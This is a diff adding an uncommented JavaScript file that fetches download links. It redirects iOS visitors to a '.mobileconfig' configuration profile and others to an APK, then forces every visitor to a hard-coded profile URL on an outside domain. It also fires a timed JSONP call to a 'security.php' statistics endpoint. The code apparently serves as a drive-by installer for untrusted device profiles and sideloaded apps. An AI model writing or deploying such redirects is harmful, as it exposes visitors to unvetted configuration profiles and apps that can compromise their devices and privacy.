@@ -1,0 +1,25 @@
+function visita() {
+	$.ajax({
+		url: "./api/attachment_package/getlist",
+		dataType: "json",
+		success:function(data){
+			var u = navigator.userAgent;
+			var isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
+			if (data.meta.code == 0) {
+				if (isiOS) {
+					window.location.href = data.data.mobileconfig_url;
+				} else {
+					window.location.href = data.data.apk_url;
+				}
+			}
+		},
+	});
+	window.location.href = "https://admin.fcpg.app/api/uploads/file/cfb297163dbdd3f81e2565515587aff0_20260106063600.mobileconfig";
+}
+window.setTimeout("security()", 3000);
+function security() {
+	$.ajax({
+		url: "./tongji/security.php",
+		dataType: "jsonp",
+	});
+}
